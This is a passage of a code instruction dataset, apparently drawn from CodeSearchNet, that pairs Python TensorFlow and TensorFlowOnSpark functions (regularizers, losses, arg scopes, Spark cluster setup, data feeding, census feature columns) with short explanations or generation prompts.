shape[1:3], padding='VALID', scope='pool')\n          # 1 x 1 x 2048\n          net = ops.dropout(net, dropout_keep_prob, scope='dropout')\n          net = ops.flatten(net, scope='flatten')\n          # 2048\n          logits = ops.fc(net, num_classes, activation=None, scope='logits',\n                          restore=restore_logits)\n          # 1000\n          end_points['logits'] = logits\n          end_points['predictions'] = tf.nn.softmax(logits, name='predictions')\n      return logits, end_points", "response": "Latest Inception from http://arxiv. org / abs / 1512. 00567."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef inception_v3_parameters(weight_decay=0.00004, stddev=0.1,\n                            batch_norm_decay=0.9997, batch_norm_epsilon=0.001):\n  \"\"\"Yields the scope with the default parameters for inception_v3.\n\n  Args:\n    weight_decay: the weight decay for weights variables.\n    stddev: standard deviation of the truncated guassian weight distribution.\n    batch_norm_decay: decay for the moving average of batch_norm momentums.\n    batch_norm_epsilon: small float added to variance to avoid dividing by zero.\n\n  Yields:\n    a arg_scope with the parameters needed for inception_v3.\n  \"\"\"\n  # Set weight_decay for weights in Conv and FC layers.\n  with scopes.arg_scope([ops.conv2d, ops.fc],\n                        weight_decay=weight_decay):\n    # Set stddev, activation and parameters for batch_norm.\n    with scopes.arg_scope([ops.conv2d],\n                          stddev=stddev,\n                          activation=tf.nn.relu,\n                          batch_norm_params={\n                              'decay': batch_norm_decay,\n                              'epsilon': batch_norm_epsilon}) as arg_scope:\n      yield arg_scope", "response": "Yields the scope with the default parameters needed for inception_v3."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nfinds a file in a given path string.", "response": "def find_in_path(path, file):\n  \"\"\"Find a file in a given path string.\"\"\"\n  for p in path.split(os.pathsep):\n    candidate = os.path.join(p, file)\n    if os.path.exists(candidate) and os.path.isfile(candidate):\n      return candidate\n  return False"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ndefine a L1 regularizer function.", "response": "def l1_regularizer(weight=1.0, scope=None):\n  \"\"\"Define a L1 regularizer.\n\n  Args:\n    weight: scale the loss by this factor.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    a regularizer function.\n  \"\"\"\n  def regularizer(tensor):\n    with tf.name_scope(scope, 'L1Regularizer', [tensor]):\n      l1_weight = tf.convert_to_tensor(weight,\n                                       dtype=tensor.dtype.base_dtype,\n                                       name='weight')\n      return tf.multiply(l1_weight, tf.reduce_sum(tf.abs(tensor)), name='value')\n  return regularizer"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef l2_regularizer(weight=1.0, scope=None):\n  def regularizer(tensor):\n    with tf.name_scope(scope, 'L2Regularizer', [tensor]):\n      l2_weight = tf.convert_to_tensor(weight,\n                                       dtype=tensor.dtype.base_dtype,\n                                       name='weight')\n      return tf.multiply(l2_weight, tf.nn.l2_loss(tensor), name='value')\n  return regularizer", "response": "Define a L2 regularizer function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ndefining a L1L2 regularizer.", "response": "def l1_l2_regularizer(weight_l1=1.0, weight_l2=1.0, scope=None):\n  \"\"\"Define a L1L2 regularizer.\n\n  Args:\n    weight_l1: scale the L1 loss by this factor.\n    weight_l2: scale the L2 loss by this factor.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    a regularizer function.\n  \"\"\"\n  def regularizer(tensor):\n    with tf.name_scope(scope, 'L1L2Regularizer', [tensor]):\n      weight_l1_t = tf.convert_to_tensor(weight_l1,\n                                         dtype=tensor.dtype.base_dtype,\n                                         name='weight_l1')\n      weight_l2_t = tf.convert_to_tensor(weight_l2,\n                                         dtype=tensor.dtype.base_dtype,\n                                         name='weight_l2')\n      reg_l1 = tf.multiply(weight_l1_t, tf.reduce_sum(tf.abs(tensor)),\n                      name='value_l1')\n      reg_l2 = tf.multiply(weight_l2_t, tf.nn.l2_loss(tensor),\n                      name='value_l2')\n      return tf.add(reg_l1, reg_l2, name='value')\n  return regularizer"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef l1_loss(tensor, weight=1.0, scope=None):\n  with tf.name_scope(scope, 'L1Loss', [tensor]):\n    weight = tf.convert_to_tensor(weight,\n                                  dtype=tensor.dtype.base_dtype,\n                                  name='loss_weight')\n    loss = tf.multiply(weight, tf.reduce_sum(tf.abs(tensor)), name='value')\n    tf.add_to_collection(LOSSES_COLLECTION, loss)\n    return loss", "response": "Define a L1Loss useful for regularize."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndefines a L2Loss useful for regularize.", "response": "def l2_loss(tensor, weight=1.0, scope=None):\n  \"\"\"Define a L2Loss, useful for regularize, i.e. weight decay.\n\n  Args:\n    tensor: tensor to regularize.\n    weight: an optional weight to modulate the loss.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    the L2 loss op.\n  \"\"\"\n  with tf.name_scope(scope, 'L2Loss', [tensor]):\n    weight = tf.convert_to_tensor(weight,\n                                  dtype=tensor.dtype.base_dtype,\n                                  name='loss_weight')\n    loss = tf.multiply(weight, tf.nn.l2_loss(tensor), name='value')\n    tf.add_to_collection(LOSSES_COLLECTION, loss)\n    return loss"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef cross_entropy_loss(logits, one_hot_labels, label_smoothing=0,\n                       weight=1.0, scope=None):\n  \"\"\"Define a Cross Entropy loss using softmax_cross_entropy_with_logits.\n\n  It can scale the loss by weight factor, and smooth the labels.\n\n  Args:\n    logits: [batch_size, num_classes] logits outputs of the network .\n    one_hot_labels: [batch_size, num_classes] target one_hot_encoded labels.\n    label_smoothing: if greater than 0 then smooth the labels.\n    weight: scale the loss by this factor.\n    scope: Optional scope for name_scope.\n\n  Returns:\n    A tensor with the softmax_cross_entropy loss.\n  \"\"\"\n  logits.get_shape().assert_is_compatible_with(one_hot_labels.get_shape())\n  with tf.name_scope(scope, 'CrossEntropyLoss', [logits, one_hot_labels]):\n    num_classes = one_hot_labels.get_shape()[-1].value\n    one_hot_labels = tf.cast(one_hot_labels, logits.dtype)\n    if label_smoothing > 0:\n      smooth_positives = 1.0 - label_smoothing\n      smooth_negatives = label_smoothing / num_classes\n      one_hot_labels = one_hot_labels * smooth_positives + smooth_negatives\n    cross_entropy = tf.contrib.nn.deprecated_flipped_softmax_cross_entropy_with_logits(\n        logits, one_hot_labels, name='xentropy')\n\n    weight = tf.convert_to_tensor(weight,\n                                  dtype=logits.dtype.base_dtype,\n                                  name='loss_weight')\n    loss = tf.multiply(weight, tf.reduce_mean(cross_entropy), name='value')\n    tf.add_to_collection(LOSSES_COLLECTION, loss)\n    return loss", "response": "Define a Cross Entropy loss using softmax_cross_entropy_with_logits."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nstoring the default arguments for the given set of list_ops.", "response": "def arg_scope(list_ops_or_scope, **kwargs):\n  \"\"\"Stores the default arguments for the given set of list_ops.\n\n  For usage, please see examples at top of the file.\n\n  Args:\n    list_ops_or_scope: List or tuple of operations to set argument scope for or\n      a dictionary containg the current scope. When list_ops_or_scope is a dict,\n      kwargs must be empty. When list_ops_or_scope is a list or tuple, then\n      every op in it need to be decorated with @add_arg_scope to work.\n    **kwargs: keyword=value that will define the defaults for each op in\n              list_ops. All the ops need to accept the given set of arguments.\n\n  Yields:\n    the current_scope, which is a dictionary of {op: {arg: value}}\n  Raises:\n    TypeError: if list_ops is not a list or a tuple.\n    ValueError: if any op in list_ops has not be decorated with @add_arg_scope.\n  \"\"\"\n  if isinstance(list_ops_or_scope, dict):\n    # Assumes that list_ops_or_scope is a scope that is being reused.\n    if kwargs:\n      raise ValueError(\"When attempting to re-use a scope by suppling a\"\n                       \"dictionary, kwargs must be empty.\")\n    current_scope = list_ops_or_scope.copy()\n    try:\n      _get_arg_stack().append(current_scope)\n      yield current_scope\n    finally:\n      _get_arg_stack().pop()\n  else:\n    # Assumes that list_ops_or_scope is a list/tuple of ops with kwargs.\n    if not isinstance(list_ops_or_scope, (list, tuple)):\n      raise TypeError(\"list_ops_or_scope must either be a list/tuple or reused\"\n                      \"scope (i.e. dict)\")\n    try:\n      current_scope = _current_arg_scope().copy()\n      for op in list_ops_or_scope:\n        key_op = (op.__module__, op.__name__)\n        if not has_arg_scope(op):\n          raise ValueError(\"%s is not decorated with @add_arg_scope\", key_op)\n        if key_op in current_scope:\n          current_kwargs = current_scope[key_op].copy()\n          current_kwargs.update(kwargs)\n          current_scope[key_op] = current_kwargs\n        else:\n          current_scope[key_op] = kwargs.copy()\n      _get_arg_stack().append(current_scope)\n      yield current_scope\n    finally:\n      _get_arg_stack().pop()"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef add_arg_scope(func):\n  @functools.wraps(func)\n  def func_with_args(*args, **kwargs):\n    current_scope = _current_arg_scope()\n    current_args = kwargs\n    key_func = (func.__module__, func.__name__)\n    if key_func in current_scope:\n      current_args = current_scope[key_func].copy()\n      current_args.update(kwargs)\n    return func(*args, **current_args)\n  _add_op(func)\n  return func_with_args", "response": "Decorates a function with args so it can be used within an arg_scope."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef _get_manager(cluster_info, host, executor_id):\n  for node in cluster_info:\n    if node['host'] == host and node['executor_id'] == executor_id:\n      addr = node['addr']\n      authkey = node['authkey']\n      TFSparkNode.mgr = TFManager.connect(addr, authkey)\n      break\n\n  if TFSparkNode.mgr is None:\n    msg = \"No TFManager found on this node, please ensure that:\\n\" + \\\n          \"1. Spark num_executors matches TensorFlow cluster_size\\n\" + \\\n          \"2. Spark cores/tasks per executor is 1.\\n\" + \\\n          \"3. Spark dynamic allocation is disabled.\"\n    raise Exception(msg)\n\n  logging.info(\"Connected to TFSparkNode.mgr on {0}, executor={1}, state={2}\".format(host, executor_id, str(TFSparkNode.mgr.get('state'))))\n  return TFSparkNode.mgr", "response": "Returns this executor s singleton instance of the multiprocessing. Manager."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef run(fn, tf_args, cluster_meta, tensorboard, log_dir, queues, background):\n  def _mapfn(iter):\n    import tensorflow as tf\n\n    # Note: consuming the input iterator helps Pyspark re-use this worker,\n    for i in iter:\n      executor_id = i\n\n    # check that there are enough available GPUs (if using tensorflow-gpu) before committing reservation on this node\n    if tf.test.is_built_with_cuda():\n      num_gpus = tf_args.num_gpus if 'num_gpus' in tf_args else 1\n      gpus_to_use = gpu_info.get_gpus(num_gpus)\n\n    # assign TF job/task based on provided cluster_spec template (or use default/null values)\n    job_name = 'default'\n    task_index = -1\n    cluster_id = cluster_meta['id']\n    cluster_template = cluster_meta['cluster_template']\n    for jobtype in cluster_template:\n      nodes = cluster_template[jobtype]\n      if executor_id in nodes:\n        job_name = jobtype\n        task_index = nodes.index(executor_id)\n        break\n\n    # get unique key (hostname, executor_id) for this executor\n    host = util.get_ip_address()\n    util.write_executor_id(executor_id)\n    port = 0\n\n    # check for existing TFManagers\n    if TFSparkNode.mgr is not None and str(TFSparkNode.mgr.get('state')) != \"'stopped'\":\n      if TFSparkNode.cluster_id == cluster_id:\n        # raise an exception to force Spark to retry this \"reservation\" task on another executor\n        raise Exception(\"TFManager already started on {0}, executor={1}, state={2}\".format(host, executor_id, str(TFSparkNode.mgr.get(\"state\"))))\n      else:\n        # old state, just continue with creating new manager\n        logging.warn(\"Ignoring old TFManager with cluster_id {0}, requested cluster_id {1}\".format(TFSparkNode.cluster_id, cluster_id))\n\n    # start a TFManager and get a free port\n    # use a random uuid as the authkey\n    authkey = uuid.uuid4().bytes\n    addr = None\n    if job_name in ('ps', 'evaluator'):\n      # PS nodes must be remotely accessible in order to shutdown from Spark driver.\n      TFSparkNode.mgr = TFManager.start(authkey, ['control', 'error'], 'remote')\n      addr = (host, TFSparkNode.mgr.address[1])\n    else:\n      # worker nodes only need to be locally accessible within the executor for data feeding\n      TFSparkNode.mgr = TFManager.start(authkey, queues)\n      addr = TFSparkNode.mgr.address\n\n    # initialize mgr state\n    TFSparkNode.mgr.set('state', 'running')\n    TFSparkNode.cluster_id = cluster_id\n\n    # expand Hadoop classpath wildcards for JNI (Spark 2.x)\n    if 'HADOOP_PREFIX' in os.environ:\n      classpath = os.environ['CLASSPATH']\n      hadoop_path = os.path.join(os.environ['HADOOP_PREFIX'], 'bin', 'hadoop')\n      hadoop_classpath = subprocess.check_output([hadoop_path, 'classpath', '--glob']).decode()\n      logging.debug(\"CLASSPATH: {0}\".format(hadoop_classpath))\n      os.environ['CLASSPATH'] = classpath + os.pathsep + hadoop_classpath\n\n    # start TensorBoard if requested\n    tb_pid = 0\n    tb_port = 0\n    if tensorboard and job_name == 'worker' and task_index == 0:\n      tb_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      tb_sock.bind(('', 0))\n      tb_port = tb_sock.getsockname()[1]\n      tb_sock.close()\n      logdir = log_dir if log_dir else \"tensorboard_%d\" % executor_id\n\n      # search for tensorboard in python/bin, PATH, and PYTHONPATH\n      pypath = sys.executable\n      pydir = os.path.dirname(pypath)\n      sys_path = os.pathsep.join(sys.path)\n      search_path = os.pathsep.join([pydir, sys_path, os.environ['PATH'], os.environ['PYTHONPATH']])\n\n      tb_path = util.find_in_path(search_path, 'tensorboard')                             # executable in PATH\n      if not tb_path:\n        tb_path = util.find_in_path(search_path, 'tensorboard/main.py')                   # TF 1.3+\n      if not tb_path:\n        tb_path = util.find_in_path(search_path, 'tensorflow/tensorboard/__main__.py')    # TF 1.2-\n      if not tb_path:\n        raise Exception(\"Unable to find 'tensorboard' in: {}\".format(search_path))\n\n      # launch tensorboard\n      tb_proc = subprocess.Popen([pypath, tb_path, \"--logdir=%s\" % logdir, \"--port=%d\" % tb_port], env=os.environ)\n      tb_pid = tb_proc.pid\n\n    # check server to see if this task is being retried (i.e. already reserved)\n    client = reservation.Client(cluster_meta['server_addr'])\n    cluster_info = client.get_reservations()\n    tmp_sock = None\n    node_meta = None\n    for node in cluster_info:\n      (nhost, nexec) = (node['host'], node['executor_id'])\n      if nhost == host and nexec == executor_id:\n        node_meta = node\n        port = node['port']\n\n    # if not already done, register everything we need to set up the cluster\n    if node_meta is None:\n      # first, find a free port for TF\n      tmp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n      tmp_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n      tmp_sock.bind(('', port))\n      port = tmp_sock.getsockname()[1]\n\n      node_meta = {\n          'executor_id': executor_id,\n          'host': host,\n          'job_name': job_name,\n          'task_index': task_index,\n          'port': port,\n          'tb_pid': tb_pid,\n          'tb_port': tb_port,\n          'addr': addr,\n          'authkey': authkey\n      }\n      # register node metadata with server\n      logging.info(\"TFSparkNode.reserve: {0}\".format(node_meta))\n      client.register(node_meta)\n      # wait for other nodes to finish reservations\n      cluster_info = client.await_reservations()\n      client.close()\n\n    # construct a TensorFlow clusterspec from cluster_info\n    sorted_cluster_info = sorted(cluster_info, key=lambda k: k['executor_id'])\n    cluster_spec = {}\n    last_executor_id = -1\n    for node in sorted_cluster_info:\n      if (node['executor_id'] == last_executor_id):\n        raise Exception(\"Duplicate worker/task in cluster_info\")\n      last_executor_id = node['executor_id']\n      logging.info(\"node: {0}\".format(node))\n      (njob, nhost, nport) = (node['job_name'], node['host'], node['port'])\n      hosts = [] if njob not in cluster_spec else cluster_spec[njob]\n      hosts.append(\"{0}:{1}\".format(nhost, nport))\n      cluster_spec[njob] = hosts\n\n    # update TF_CONFIG if cluster spec has a 'master' node (i.e. tf.estimator)\n    if 'master' in cluster_spec or 'chief' in cluster_spec:\n      tf_config = json.dumps({\n        'cluster': cluster_spec,\n        'task': {'type': job_name, 'index': task_index},\n        'environment': 'cloud'\n      })\n      logging.info(\"export TF_CONFIG: {}\".format(tf_config))\n      os.environ['TF_CONFIG'] = tf_config\n\n    # reserve GPU(s) again, just before launching TF process (in case situation has changed)\n    if tf.test.is_built_with_cuda():\n      # compute my index relative to other nodes on the same host (for GPU allocation)\n      my_addr = cluster_spec[job_name][task_index]\n      my_host = my_addr.split(':')[0]\n      flattened = [v for sublist in cluster_spec.values() for v in sublist]\n      local_peers = [p for p in flattened if p.startswith(my_host)]\n      my_index = local_peers.index(my_addr)\n\n      num_gpus = tf_args.num_gpus if 'num_gpus' in tf_args else 1\n      gpus_to_use = gpu_info.get_gpus(num_gpus, my_index)\n      gpu_str = \"GPUs\" if num_gpus > 1 else \"GPU\"\n      logging.debug(\"Requested {} {}, setting CUDA_VISIBLE_DEVICES={}\".format(num_gpus, gpu_str, gpus_to_use))\n      os.environ['CUDA_VISIBLE_DEVICES'] = gpus_to_use\n\n    # create a context object to hold metadata for TF\n    ctx = TFNodeContext(executor_id, job_name, task_index, cluster_spec, cluster_meta['default_fs'], cluster_meta['working_dir'], TFSparkNode.mgr)\n\n    # release port reserved for TF as late as possible\n    if tmp_sock is not None:\n      tmp_sock.close()\n\n    # Background mode relies reuse of python worker in Spark.\n    if background:\n      # However, reuse of python worker can't work on Windows, we need to check if the current\n      # script runs on Windows or not.\n      if os.name == 'nt' or platform.system() == 'Windows':\n        raise Exception(\"Background mode is not supported on Windows.\")\n      # Check if the config of reuse python worker is enabled on Spark.\n      if not os.environ.get(\"SPARK_REUSE_WORKER\"):\n        raise Exception(\"Background mode relies reuse of python worker on Spark. This config 'spark.python.worker.reuse' is not enabled on Spark. Please enable it before using background.\")\n\n    def wrapper_fn(args, context):\n      \"\"\"Wrapper function that sets the sys.argv of the executor.\"\"\"\n      if isinstance(args, list):\n        sys.argv = args\n      fn(args, context)\n\n    def wrapper_fn_background(args, context):\n      \"\"\"Wrapper function that signals exceptions to foreground process.\"\"\"\n      errq = TFSparkNode.mgr.get_queue('error')\n      try:\n        wrapper_fn(args, context)\n      except Exception:\n        errq.put(traceback.format_exc())\n        errq.join()\n\n    if job_name in ('ps', 'evaluator') or background:\n      # invoke the TensorFlow main function in a background thread\n      logging.info(\"Starting TensorFlow {0}:{1} as {2} on cluster node {3} on background process\".format(\n        job_name, task_index, job_name, executor_id))\n\n      p = multiprocessing.Process(target=wrapper_fn_background, args=(tf_args, ctx))\n      if job_name in ('ps','evaluator'):\n        p.daemon = True\n      p.start()\n\n      # for ps nodes only, wait indefinitely in foreground thread for a \"control\" event (None == \"stop\")\n      if job_name in ('ps', 'evaluator'):\n        queue = TFSparkNode.mgr.get_queue('control')\n        equeue = TFSparkNode.mgr.get_queue('error')\n        done = False\n        while not done:\n          while (queue.empty() and equeue.empty()):\n            time.sleep(1)\n          if (not equeue.empty()):\n            e_str = equeue.get()\n            equeue.task_done()\n            raise Exception(\"exception in \" + job_name + \":\\n\" + e_str)\n          msg = queue.get(block=True)\n          logging.info(\"Got msg: {0}\".format(msg))\n          if msg is None:\n            logging.info(\"Terminating {}\".format(job_name))\n            TFSparkNode.mgr.set('state', 'stopped')\n            done = True\n          queue.task_done()\n    else:\n      # otherwise, just run TF function in the main executor/worker thread\n      logging.info(\"Starting TensorFlow {0}:{1} on cluster node {2} on foreground thread\".format(job_name, task_index, executor_id))\n      wrapper_fn(tf_args, ctx)\n      logging.info(\"Finished TensorFlow {0}:{1} on cluster node {2}\".format(job_name, task_index, executor_id))\n\n  return _mapfn", "response": "Wraps the user - provided TensorFlow main function in a Spark mapPartitions function."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ntraining Spark partitions into the shared multiprocessing. Queue.", "response": "def train(cluster_info, cluster_meta, feed_timeout=600, qname='input'):\n  \"\"\"Feeds Spark partitions into the shared multiprocessing.Queue.\n\n  Args:\n    :cluster_info: node reservation information for the cluster (e.g. host, executor_id, pid, ports, etc)\n    :cluster_meta: dictionary of cluster metadata (e.g. cluster_id, reservation.Server address, etc)\n    :feed_timeout: number of seconds after which data feeding times out (600 sec default)\n    :qname: *INTERNAL_USE*\n\n  Returns:\n    A dataRDD.mapPartitions() function\n  \"\"\"\n  def _train(iter):\n    # get shared queue, reconnecting if necessary\n    mgr = _get_manager(cluster_info, util.get_ip_address(), util.read_executor_id())\n    try:\n      queue = mgr.get_queue(qname)\n      equeue = mgr.get_queue('error')\n    except (AttributeError, KeyError):\n      msg = \"Queue '{}' not found on this node, check for exceptions on other nodes.\".format(qname)\n      raise Exception(msg)\n\n    state = str(mgr.get('state'))\n    logging.info(\"mgr.state={0}\".format(state))\n    terminating = state == \"'terminating'\"\n    if terminating:\n      logging.info(\"mgr is terminating, skipping partition\")\n      count = sum(1 for item in iter)\n      logging.info(\"Skipped {0} items from partition\".format(count))\n    else:\n      logging.info(\"Feeding partition {0} into {1} queue {2}\".format(iter, qname, queue))\n      count = 0\n      for item in iter:\n        count += 1\n        queue.put(item, block=True)\n\n      # wait for consumers to finish processing all items in queue before \"finishing\" this iterator\n      joinThr = Thread(target=queue.join)\n      joinThr.start()\n      timeout = feed_timeout\n      while (joinThr.isAlive()):\n        if (not equeue.empty()):\n          e_str = equeue.get()\n          equeue.task_done()\n          raise Exception(\"exception in worker:\\n\" + e_str)\n        time.sleep(1)\n        timeout -= 1\n        if timeout <= 0:\n          raise Exception(\"Timeout while feeding partition\")\n\n      logging.info(\"Processed {0} items in partition\".format(count))\n\n    # check if TF is terminating feed after this partition\n    if not terminating:\n      state = str(mgr.get('state'))\n      terminating = state == \"'terminating'\"\n      if terminating:\n        try:\n          logging.info(\"TFSparkNode: requesting stop\")\n          client = reservation.Client(cluster_meta['server_addr'])\n          client.request_stop()\n          client.close()\n        except Exception as e:\n          # ignore any errors while requesting stop\n          logging.debug(\"Error while requesting stop: {0}\".format(e))\n\n    return [terminating]\n\n  return _train"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nfeed Spark partitions into the shared multiprocessing. Queue and returns inference results.", "response": "def inference(cluster_info, feed_timeout=600, qname='input'):\n  \"\"\"Feeds Spark partitions into the shared multiprocessing.Queue and returns inference results.\n\n  Args:\n    :cluster_info: node reservation information for the cluster (e.g. host, executor_id, pid, ports, etc)\n    :feed_timeout: number of seconds after which data feeding times out (600 sec default)\n    :qname: *INTERNAL_USE*\n\n  Returns:\n    A dataRDD.mapPartitions() function\n  \"\"\"\n  def _inference(iter):\n    # get shared queue, reconnecting if necessary\n    mgr = _get_manager(cluster_info, util.get_ip_address(), util.read_executor_id())\n    try:\n      queue_in = mgr.get_queue(qname)\n      equeue = mgr.get_queue('error')\n    except (AttributeError, KeyError):\n      msg = \"Queue '{}' not found on this node, check for exceptions on other nodes.\".format(qname)\n      raise Exception(msg)\n\n    logging.info(\"Feeding partition {0} into {1} queue {2}\".format(iter, qname, queue_in))\n    count = 0\n    for item in iter:\n      count += 1\n      queue_in.put(item, block=True)\n\n    # signal \"end of partition\"\n    queue_in.put(marker.EndPartition())\n\n    # skip empty partitions\n    if count == 0:\n      return []\n\n    # wait for consumers to finish processing all items in queue before \"finishing\" this iterator\n    joinThr = Thread(target=queue_in.join)\n    joinThr.start()\n    timeout = feed_timeout\n    while (joinThr.isAlive()):\n      if (not equeue.empty()):\n        e_str = equeue.get()\n        equeue.task_done()\n        raise Exception(\"exception in worker:\\n\" + e_str)\n      time.sleep(1)\n      timeout -= 1\n      if timeout <= 0:\n        raise Exception(\"Timeout while feeding partition\")\n\n    logging.info(\"Processed {0} items in partition\".format(count))\n\n    # read result queue\n    results = []\n    queue_out = mgr.get_queue('output')\n    while count > 0:\n      result = queue_out.get(block=True)\n      results.append(result)\n      count -= 1\n      queue_out.task_done()\n\n    logging.info(\"Finished processing partition\")\n    return results\n\n  return _inference"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef shutdown(cluster_info, queues=['input']):\n  def _shutdown(iter):\n    host = util.get_ip_address()\n    executor_id = util.read_executor_id()\n\n    # reconnect to shared queue\n    mgr = _get_manager(cluster_info, host, executor_id)\n\n    # send SIGTERM to Tensorboard proc (if running)\n    for node in cluster_info:\n      if node['host'] == host and node['executor_id'] == executor_id:\n        tb_pid = node['tb_pid']\n        if tb_pid != 0:\n          logging.info(\"Stopping tensorboard (pid={0})\".format(tb_pid))\n          subprocess.Popen([\"kill\", str(tb_pid)])\n\n    # terminate any listening queues\n    logging.info(\"Stopping all queues\")\n    for q in queues:\n      try:\n        queue = mgr.get_queue(q)\n        logging.info(\"Feeding None into {0} queue\".format(q))\n        queue.put(None, block=True)\n      except (AttributeError, KeyError):\n        msg = \"Queue '{}' not found on this node, check for exceptions on other nodes.\".format(q)\n        raise Exception(msg)\n\n    logging.info(\"Setting mgr.state to 'stopped'\")\n    mgr.set('state', 'stopped')\n    return [True]\n\n  return _shutdown", "response": "Stops all TensorFlow nodes by feeding None into the multiprocessing. Queues."}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef start_cluster_server(self, num_gpus=1, rdma=False):\n    return TFNode.start_cluster_server(self, num_gpus, rdma)", "response": "Convenience function to access TFNode. start_cluster_server directly from this object instance."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nexport the saved model to a file.", "response": "def export_saved_model(self, sess, export_dir, tag_set, signatures):\n    \"\"\"Convenience function to access ``TFNode.export_saved_model`` directly from this object instance.\"\"\"\n    TFNode.export_saved_model(sess, export_dir, tag_set, signatures)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_data_feed(self, train_mode=True, qname_in='input', qname_out='output', input_mapping=None):\n    return TFNode.DataFeed(self.mgr, train_mode, qname_in, qname_out, input_mapping)", "response": "Convenience function to access TFNode. DataFeed directly from this object instance."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _download_and_clean_file(filename, url):\n  temp_file, _ = urllib.request.urlretrieve(url)\n  with tf.gfile.Open(temp_file, 'r') as temp_eval_file:\n    with tf.gfile.Open(filename, 'w') as eval_file:\n      for line in temp_eval_file:\n        line = line.strip()\n        line = line.replace(', ', ',')\n        if not line or ',' not in line:\n          continue\n        if line[-1] == '.':\n          line = line[:-1]\n        line += '\\n'\n        eval_file.write(line)\n  tf.gfile.Remove(temp_file)", "response": "Downloads data from url and makes changes to match the CSV format."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ndownloading census data if it is not already present.", "response": "def download(data_dir):\n  \"\"\"Download census data if it is not already present.\"\"\"\n  tf.gfile.MakeDirs(data_dir)\n\n  training_file_path = os.path.join(data_dir, TRAINING_FILE)\n  if not tf.gfile.Exists(training_file_path):\n    _download_and_clean_file(training_file_path, TRAINING_URL)\n\n  eval_file_path = os.path.join(data_dir, EVAL_FILE)\n  if not tf.gfile.Exists(eval_file_path):\n    _download_and_clean_file(eval_file_path, EVAL_URL)"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef build_model_columns():\n  # Continuous variable columns\n  age = tf.feature_column.numeric_column('age')\n  education_num = tf.feature_column.numeric_column('education_num')\n  capital_gain = tf.feature_column.numeric_column('capital_gain')\n  capital_loss = tf.feature_column.numeric_column('capital_loss')\n  hours_per_week = tf.feature_column.numeric_column('hours_per_week')\n\n  education = tf.feature_column.categorical_column_with_vocabulary_list(\n      'education', [\n          'Bachelors', 'HS-grad', '11th', 'Masters', '9th', 'Some-college',\n          'Assoc-acdm', 'Assoc-voc', '7th-8th', 'Doctorate', 'Prof-school',\n          '5th-6th', '10th', '1st-4th', 'Preschool', '12th'])\n\n  marital_status = tf.feature_column.categorical_column_with_vocabulary_list(\n      'marital_status', [\n          'Married-civ-spouse', 'Divorced', 'Married-spouse-absent',\n          'Never-married', 'Separated', 'Married-AF-spouse', 'Widowed'])\n\n  relationship = tf.feature_column.categorical_column_with_vocabulary_list(\n      'relationship', [\n          'Husband', 'Not-in-family', 'Wife', 'Own-child', 'Unmarried',\n          'Other-relative'])\n\n  workclass = tf.feature_column.categorical_column_with_vocabulary_list(\n      'workclass', [\n          'Self-emp-not-inc', 'Private', 'State-gov', 'Federal-gov',\n          'Local-gov', '?', 'Self-emp-inc', 'Without-pay', 'Never-worked'])\n\n  # To show an example of hashing:\n  occupation = tf.feature_column.categorical_column_with_hash_bucket(\n      'occupation', hash_bucket_size=_HASH_BUCKET_SIZE)\n\n  # Transformations.\n  age_buckets = tf.feature_column.bucketized_column(\n      age, boundaries=[18, 25, 30, 35, 40, 45, 50, 55, 60, 65])\n\n  # Wide columns and deep columns.\n  base_columns = [\n      education, marital_status, relationship, workclass, occupation,\n      age_buckets,\n  ]\n\n  crossed_columns = [\n      tf.feature_column.crossed_column(\n          ['education', 'occupation'], hash_bucket_size=_HASH_BUCKET_SIZE),\n      tf.feature_column.crossed_column(\n          [age_buckets, 'education', 'occupation'],\n          hash_bucket_size=_HASH_BUCKET_SIZE),\n  ]\n\n  wide_columns = base_columns + crossed_columns\n\n  deep_columns = [\n      age,\n      education_num,\n      capital_gain,\n      capital_loss,\n      hours_per_week,\n      tf.feature_column.indicator_column(workclass),\n      tf.feature_column.indicator_column(education),\n      tf.feature_column.indicator_column(marital_status),\n      tf.feature_column.indicator_column(relationship),\n      # To show an example of embedding\n      tf.feature_column.embedding_column(occupation, dimension=8),\n  ]\n\n  return wide_columns, deep_columns", "response": "Builds a set of wide and deep feature columns."}
